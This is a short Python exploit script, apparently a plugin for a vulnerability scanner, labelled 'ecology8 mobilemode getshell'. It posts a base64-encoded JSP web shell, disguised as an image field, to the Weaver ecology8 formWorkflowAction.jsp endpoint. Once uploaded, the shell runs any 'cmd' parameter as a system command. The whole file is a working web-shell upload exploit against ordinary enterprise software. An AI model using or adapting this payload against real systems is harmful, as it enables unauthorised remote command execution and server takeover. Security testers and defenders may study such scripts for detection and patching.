#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    ecology8 mobilemode getshell
    you should look for url by xxe or sql " + '?pwd=whoami
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        url = path +"mobilemode/formWorkflowAction.jsp"
                        data = 'action=createWorkflow&fieldname_photo=data%3Aimage%2Fjsp%3Bbase64%2CPCUKICAgIGlmKCJjb25maWciLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsKICAgICAgICBieXRlW10gYiA9IG5ldyBieXRlWzIwNDhdOwogICAgICAgIG91dC5wcmludCgiPHByZT4iKTsKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsKICAgICAgICB9CiAgICAgICAgb3V0LnByaW50KCI8L3ByZT4iKTsKICAgIH0KJT4%3D&type_photo=photo&workflowid=zzz&workflowtitle=zzz&datasource=xxx&tablename=xxx'

                        async with session.post(url=url, data=data) as res:
                            if res != None:
                                text = await res.text()
                                if '"status":"0"' in text:
                                    yield url
                                    
